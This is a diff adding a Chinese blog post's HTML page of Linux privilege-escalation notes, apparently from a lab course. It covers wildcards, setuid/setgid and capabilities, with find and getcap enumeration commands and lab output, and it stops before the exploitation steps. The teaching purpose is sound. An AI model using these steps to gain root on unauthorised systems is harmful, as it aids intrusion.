@@ -1,0 +1,847 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>linux提权 | 小chen妙妙屋</title><meta name="author" content="chen7chen"><meta name="copyright" content="chen7chen"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="通配符泛滥通配符可以用作其他字符的替代，并且在其他操作之前由 shell 解释。通配符的例子包括：     Character  角色 Significance  意义     * 一个星号，可以匹配文件名中的任意数量的字符。   ? 匹配单个字符。   [ ] 括号中包含字符，并且可以在定义的位置匹配任意单个字符。   ~ 一个开头的波浪号扩展为用户主目录的名称，或者可以追加另一个用户名来引用该">
+<meta property="og:type" content="article">
+<meta property="og:title" content="linux提权">
+<meta property="og:url" content="http://blog.xchstudy.org/2026/05/09/1%20%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/3%20%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/07%20%E5%90%8E%E6%B8%97%E9%80%8F%E9%98%B6%E6%AE%B5/2%20%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90%E4%B8%8E%E5%90%8E%E9%97%A8/linux%E6%8F%90%E6%9D%83/2%20Linux%E6%8F%90%E6%9D%83/index.html">
+<meta property="og:site_name" content="小chen妙妙屋">
+<meta property="og:description" content="通配符泛滥通配符可以用作其他字符的替代，并且在其他操作之前由 shell 解释。通配符的例子包括：     Character  角色 Significance  意义     * 一个星号，可以匹配文件名中的任意数量的字符。   ? 匹配单个字符。   [ ] 括号中包含字符，并且可以在定义的位置匹配任意单个字符。   ~ 一个开头的波浪号扩展为用户主目录的名称，或者可以追加另一个用户名来引用该">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic.chenjichao.site/raw/8.webp">
+<meta property="article:published_time" content="2026-05-08T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-12T12:47:16.941Z">
+<meta property="article:author" content="chen7chen">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic.chenjichao.site/raw/8.webp"><link rel="shortcut icon" href="/img/output.png"><link rel="canonical" href="http://blog.xchstudy.org/2026/05/09/1%20%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/3%20%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/07%20%E5%90%8E%E6%B8%97%E9%80%8F%E9%98%B6%E6%AE%B5/2%20%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90%E4%B8%8E%E5%90%8E%E9%97%A8/linux%E6%8F%90%E6%9D%83/2%20Linux%E6%8F%90%E6%9D%83/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: true,
+  islazyload: true,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'linux提权',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2026-06-12 20:47:16'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="/css/music.css" media="defer" onload="this.media='all'"><svg aria-hidden="true" style="position:absolute; overflow:hidden; width:0; height:0"><symbol id="icon-sun" viewBox="0 0 1024 1024"><path d="M960 512l-128 128v192h-192l-128 128-128-128H192v-192l-128-128 128-128V192h192l128-128 128 128h192v192z" fill="#FFD878" p-id="8420"></path><path d="M736 512a224 224 0 1 0-448 0 224 224 0 1 0 448 0z" fill="#FFE4A9" p-id="8421"></path><path d="M512 109.248L626.752 224H800v173.248L914.752 512 800 626.752V800h-173.248L512 914.752 397.248 800H224v-173.248L109.248 512 224 397.248V224h173.248L512 109.248M512 64l-128 128H192v192l-128 128 128 128v192h192l128 128 128-128h192v-192l128-128-128-128V192h-192l-128-128z" fill="#4D5152" p-id="8422"></path><path d="M512 320c105.888 0 192 86.112 192 192s-86.112 192-192 192-192-86.112-192-192 86.112-192 192-192m0-32a224 224 0 1 0 0 448 224 224 0 0 0 0-448z" fill="#4D5152" p-id="8423"></path></symbol><symbol id="icon-moon" viewBox="0 0 1024 1024"><path d="M611.370667 167.082667a445.013333 445.013333 0 0 1-38.4 161.834666 477.824 477.824 0 0 1-244.736 244.394667 445.141333 445.141333 0 0 1-161.109334 38.058667 85.077333 85.077333 0 0 0-65.066666 135.722666A462.08 462.08 0 1 0 747.093333 102.058667a85.077333 85.077333 0 0 0-135.722666 65.024z" fill="#FFB531" p-id="11345"></path><path d="M329.728 274.133333l35.157333-35.157333a21.333333 21.333333 0 1 0-30.165333-30.165333l-35.157333 35.157333-35.114667-35.157333a21.333333 21.333333 0 0 0-30.165333 30.165333l35.114666 35.157333-35.114666 35.157334a21.333333 21.333333 0 1 0 30.165333 30.165333l35.114667-35.157333 35.157333 35.157333a21.333333 21.333333 0 1 0 30.165333-30.165333z" fill="#030835" p-id="11346"></path></symbol></svg><!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiperstyle.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://unpkg.com/hexo-butterfly-wowjs/lib/animate.min.css" media="print" onload="this.media='screen'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Zfour/Butterfly-double-row-display@1.00/cardlistpost.min.css"/>
+<style>#recent-posts > .recent-post-item >.recent-post-info > .article-meta-wrap > .tags:before {content:"\A";
+  white-space: pre;}#recent-posts > .recent-post-item >.recent-post-info > .article-meta-wrap > .tags > .article-meta__separator{display:none}</style>
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="小chen妙妙屋" type="application/atom+xml">
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load',() => { preloader.endLoading() })
+
+  if (true) {
+    document.addEventListener('pjax:send', () => { preloader.initLoading() })
+    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+  }
+})()</script><div id="web_bg"></div><div id="an_music_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/images.webp" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">224</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">48</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">162</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/bangumis/"><i class="fa-fw fa-brands fa-youtube"></i><span> 番剧</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fas fa-link"></i><span> 链接</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/link/#%E5%90%84%E4%BD%8D%E5%B8%88%E5%82%85"><i class="fa-fw fas fa-user-friends"></i><span> 友情链接</span></a></li><li><a class="site-page child" href="/link/#%E6%8A%80%E6%9C%AF%E9%93%BE%E6%8E%A5"><i class="fa-fw fas fa-laptop-code"></i><span> 技术链接</span></a></li></ul></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://wiki.xchstudy.org/"><i class="fa-fw fas fa-book-open"></i><span> wiki</span></a></div><div class="menus_item"><a class="site-page" href="/message/"><i class="fa-fw fas fa-coffee"></i><span> 留言板</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://pic.chenjichao.site/raw/8.webp')"><nav id="nav"><span id="blog-info"><a href="/" title="小chen妙妙屋"><img class="site-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img%5Coutput.png"/><span class="site-name">小chen妙妙屋</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/bangumis/"><i class="fa-fw fa-brands fa-youtube"></i><span> 番剧</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fas fa-link"></i><span> 链接</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/link/#%E5%90%84%E4%BD%8D%E5%B8%88%E5%82%85"><i class="fa-fw fas fa-user-friends"></i><span> 友情链接</span></a></li><li><a class="site-page child" href="/link/#%E6%8A%80%E6%9C%AF%E9%93%BE%E6%8E%A5"><i class="fa-fw fas fa-laptop-code"></i><span> 技术链接</span></a></li></ul></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://wiki.xchstudy.org/"><i class="fa-fw fas fa-book-open"></i><span> wiki</span></a></div><div class="menus_item"><a class="site-page" href="/message/"><i class="fa-fw fas fa-coffee"></i><span> 留言板</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">linux提权</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-05-08T16:00:00.000Z" title="发表于 2026-05-09 00:00:00">2026-05-09</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-06-12T12:47:16.941Z" title="更新于 2026-06-12 20:47:16">2026-06-12</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span id="" data-flag-title="linux提权"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="twikoo_visitors"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="通配符泛滥"><a href="#通配符泛滥" class="headerlink" title="通配符泛滥"></a>通配符泛滥</h1><p>通配符可以用作其他字符的替代，并且在其他操作之前由 shell 解释。通配符的例子包括：</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th><strong>Character  角色</strong></th>
+<th><strong>Significance  意义</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>*</code></td>
+<td>一个星号，可以匹配文件名中的任意数量的字符。</td>
+</tr>
+<tr>
+<td><code>?</code></td>
+<td>匹配单个字符。</td>
+</tr>
+<tr>
+<td><code>[ ]</code></td>
+<td>括号中包含字符，并且可以在定义的位置匹配任意单个字符。</td>
+</tr>
+<tr>
+<td>~</td>
+<td>一个开头的波浪号扩展为用户主目录的名称，或者可以追加另一个用户名来引用该用户的主目录。</td>
+</tr>
+<tr>
+<td><code>-</code></td>
+<td>括号内的连字符将表示一个字符范围。</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h1 id="特殊权限提权"><a href="#特殊权限提权" class="headerlink" title="特殊权限提权"></a>特殊权限提权</h1><h2 id="特殊权限"><a href="#特殊权限" class="headerlink" title="特殊权限"></a>特殊权限</h2><h3 id="setuid"><a href="#setuid" class="headerlink" title="setuid"></a><code>setuid</code></h3><p><code>Set User ID upon Execution</code> ( <code>setuid</code> ) 权限可以允许用户以另一个用户的权限执行程序或脚本，通常具有提升的权限。 <code>setuid</code> 位显示为 <code>s</code> 。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \; 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">-rwsr-xr-x 1 root root 16728 Sep  1 19:06 /home/htb-student/shared_obj_hijack/payroll</span><br><span class="line">-rwsr-xr-x 1 root root 16728 Sep  1 22:05 /home/mrb3n/payroll</span><br><span class="line">-rwSr--r-- 1 root root 0 Aug 31 02:51 /home/cliff.moore/netracer</span><br><span class="line">-rwsr-xr-x 1 root root 40152 Nov 30  2017 /bin/mount</span><br><span class="line">-rwsr-xr-x 1 root root 40128 May 17  2017 /bin/su</span><br><span class="line">-rwsr-xr-x 1 root root 27608 Nov 30  2017 /bin/umount</span><br><span class="line">-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6</span><br><span class="line">-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount</span><br><span class="line">-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping</span><br><span class="line">-rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g</span><br><span class="line">-rwsr-xr-x 1 root root 38984 Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic</span><br><span class="line">-rwsr-xr-- 1 root messagebus 42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">-rwsr-xr-x 1 root root 14864 Jan 18  2016 /usr/lib/policykit-1/polkit-agent-helper-1</span><br><span class="line">-rwsr-sr-x 1 root root 85832 Nov 30  2017 /usr/lib/snapd/snap-confine</span><br><span class="line">-rwsr-xr-x 1 root root 428240 Jan 18  2018 /usr/lib/openssh/ssh-keysign</span><br><span class="line">-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device</span><br><span class="line">-rwsr-xr-x 1 root root 23376 Jan 18  2016 /usr/bin/pkexec</span><br><span class="line">-rwsr-xr-x 1 root root 39904 May 17  2017 /usr/bin/newgrp</span><br><span class="line">-rwsr-xr-x 1 root root 32944 May 17  2017 /usr/bin/newuidmap</span><br><span class="line">-rwsr-xr-x 1 root root 49584 May 17  2017 /usr/bin/chfn</span><br><span class="line">-rwsr-xr-x 1 root root 136808 Jul  4  2017 /usr/bin/sudo</span><br><span class="line">-rwsr-xr-x 1 root root 40432 May 17  2017 /usr/bin/chsh</span><br><span class="line">-rwsr-xr-x 1 root root 32944 May 17  2017 /usr/bin/newgidmap</span><br><span class="line">-rwsr-xr-x 1 root root 75304 May 17  2017 /usr/bin/gpasswd</span><br><span class="line">-rwsr-xr-x 1 root root 54256 May 17  2017 /usr/bin/passwd</span><br><span class="line">-rwsr-xr-x 1 root root 10624 May  9  2018 /usr/bin/vmware-user-suid-wrapper</span><br><span class="line">-rwsr-xr-x 1 root root 1588768 Aug 31 00:50 /usr/bin/screen-4.5.0</span><br><span class="line">-rwsr-xr-x 1 root root 94240 Jun  9 14:54 /sbin/mount.nfs</span><br></pre></td></tr></table></figure>
+<p>可能可以通过设置 SETUID 位来逆向工程程序，识别漏洞，并利用此漏洞提升权限。许多程序具有可以用来执行命令的附加功能，如果 <code>setuid</code> 位被设置在这些程序上，这些功能就可以用于我们的目的。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -6000 -exec ls -ldb &#123;&#125; \; 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<h3 id="Set-Group-ID"><a href="#Set-Group-ID" class="headerlink" title="Set-Group-ID"></a><code>Set-Group-ID</code></h3><p>Set-Group-ID（setgid）权限是另一种特殊权限，它允许我们以创建它们的组的身份运行二进制文件。可以使用以下命令枚举这些文件： <code>find / -uid 0 -perm -6000 -type f 2&gt;/dev/null</code> 。这些文件可以像 <code>setuid</code> 二进制文件一样被利用来提升权限。</p>
+<h2 id="Capabilities提权"><a href="#Capabilities提权" class="headerlink" title="Capabilities提权"></a>Capabilities提权</h2><p>Linux capabilities 是 Linux 操作系统中的一个安全特性，它允许将特定的权限授予进程，使它们能够执行通常受限的特定操作。这允许对哪些进程可以访问特定权限进行更细粒度的控制，使其比传统的 Unix 模型（为用户和组授予权限）更安全。</p>
+<p>然而，和任何安全特性一样，Linux capabilities 并非无懈可击，攻击者可以加以利用。一个常见的漏洞是使用 capabilities 给那些没有充分沙箱化或与其他进程隔离不足的进程赋予权限，这使我们能够提升它们的权限并访问敏感信息或执行未授权操作。</p>
+<p>另一个潜在漏洞是功能的误用或过度使用，这可能导致进程拥有超出其所需的权限。这会创建不必要的 security 风险，因为我们可以利用这些权限来获取敏感信息或执行未经授权的操作。</p>
+<p>总的来说，Linux Capabilities可以是一个实用的 security 功能，但必须小心谨慎地正确使用，以避免漏洞和潜在的利用。</p>
+<h3 id="设置Capabilities"><a href="#设置Capabilities" class="headerlink" title="设置Capabilities"></a>设置Capabilities</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic</span><br></pre></td></tr></table></figure>
+<p>当为二进制文件设置权限时，这意味着该二进制文件将能够执行某些特定操作，而没有这些权限则无法执行。例如，如果为二进制文件设置了 <code>cap_net_bind_service</code> 权限，该二进制文件将能够绑定到网络端口，这是一个通常受限的特权。</p>
+<p>某些功能，例如 <code>cap_sys_admin</code> ，它允许可执行文件以管理员权限执行操作，如果使用不当可能会很危险。例如，我们可以利用它们来提升权限，获取敏感信息或执行未经授权的操作。因此，为正确沙盒化并隔离的可执行文件设置这些类型的功能至关重要，并避免不必要地授予它们。</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th><strong>Capability  功能</strong></th>
+<th><strong>Description  描述</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>cap_sys_admin</code></td>
+<td>允许以管理员权限执行操作，例如修改系统文件或更改系统设置。</td>
+</tr>
+<tr>
+<td><code>cap_sys_chroot</code></td>
+<td>允许更改当前进程的根目录，使其能够访问原本无法访问的文件和目录。</td>
+</tr>
+<tr>
+<td><code>cap_sys_ptrace</code></td>
+<td>允许附加到并调试其他进程，可能使其能够访问敏感信息或修改其他进程的行为。</td>
+</tr>
+<tr>
+<td><code>cap_sys_nice</code></td>
+<td>允许提高或降低进程的优先级，可能使其能够访问原本受限的资源。</td>
+</tr>
+<tr>
+<td><code>cap_sys_time</code></td>
+<td>允许修改系统时钟，可能允许其操纵时间戳或导致其他进程以意想不到的方式运行。</td>
+</tr>
+<tr>
+<td><code>cap_sys_resource</code></td>
+<td>允许修改系统资源限制，例如最大打开文件描述符数量或可分配的最大内存量。</td>
+</tr>
+<tr>
+<td><code>cap_sys_module</code></td>
+<td>允许加载和卸载内核模块，可能允许其修改操作系统的行为或获取敏感信息。</td>
+</tr>
+<tr>
+<td><code>cap_net_bind_service</code></td>
+<td>允许绑定到网络端口，可能允许其获取敏感信息或执行未经授权的操作。</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>当可执行文件具有功能时，它可以执行功能允许的操作。但是，它将无法执行任何功能不允许的操作。这允许对二进制文件的权限进行更细粒度的控制，并有助于防止安全漏洞和未经授权访问敏感信息。</p>
+<p>在使用 <code>setcap</code> 命令在 Linux 中为可执行文件设置功能时，我们需要指定要设置的功能以及要分配的值。我们使用的值将取决于我们正在设置的具体功能以及我们想要授予可执行文件的权限。</p>
+<p>以下是一些我们可以与 <code>setcap</code> 命令一起使用的值的示例，以及它们的作用的简要描述：</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th><strong>Capability Values  功能值</strong></th>
+<th><strong>Description  描述</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>=</code></td>
+<td>此值设置可执行文件的指定功能，但不授予任何权限。如果我们想清除可执行文件之前设置的功能，这会很有用。</td>
+</tr>
+<tr>
+<td><code>+ep</code></td>
+<td>此值授予可执行文件指定功能的有效和允许的权限。这允许可执行文件执行功能允许的操作，但不允许它执行功能不允许的任何操作。</td>
+</tr>
+<tr>
+<td><code>+ei</code></td>
+<td>此值授予指定功能给可执行文件足够的可继承权限。这允许可执行文件执行功能允许的操作，并由可执行文件产生的子进程继承该功能并执行相同操作。</td>
+</tr>
+<tr>
+<td><code>+p</code></td>
+<td>此值授予指定能力对可执行程序的有效权限。这允许可执行程序执行该能力允许的操作，但不允许其执行任何该能力不允许的操作。如果我们希望授予可执行程序该能力，但阻止其继承该能力或允许子进程继承它，这会很有用。</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>一些 Linux 能力可用于提升用户的权限至 <code>root</code> ，包括：</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th><strong>Capability  功能</strong></th>
+<th><strong>Description  描述</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>cap_setuid</code></td>
+<td>允许进程设置其有效用户 ID，这可以用来获得另一个用户的权限，包括 <code>root</code> 用户。</td>
+</tr>
+<tr>
+<td><code>cap_setgid</code></td>
+<td>允许设置其有效组 ID，这可以用来获得另一个组的权限，包括 <code>root</code> 组。</td>
+</tr>
+<tr>
+<td><code>cap_sys_admin</code></td>
+<td>这项功能提供了广泛的行政权限，包括执行许多仅限 <code>root</code> 用户保留的操作的能力，例如修改系统设置以及挂载和卸载文件系统。</td>
+</tr>
+<tr>
+<td><code>cap_dac_override</code></td>
+<td>允许绕过文件读、写和执行权限检查。</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h3 id="枚举Capabilities"><a href="#枚举Capabilities" class="headerlink" title="枚举Capabilities"></a>枚举Capabilities</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap &#123;&#125; \;</span><br></pre></td></tr></table></figure>
+<p>这行代码使用 <code>find</code> 命令搜索典型位置的所有二进制可执行文件，然后使用 <code>-exec</code> 标志在每个文件上运行 <code>getcap</code> 命令，显示为该二进制文件设置的功能。该命令的输出将显示系统上所有二进制可执行文件以及每个文件设置的功能列表。<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getcap -r / 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
+<hr>
+<h3 id="capabilities可执行文件利用"><a href="#capabilities可执行文件利用" class="headerlink" title="capabilities可执行文件利用"></a>capabilities可执行文件利用</h3><p>如果我们使用低权限账户访问系统，然后发现了 <code>cap_dac_override</code> 功能：</p>
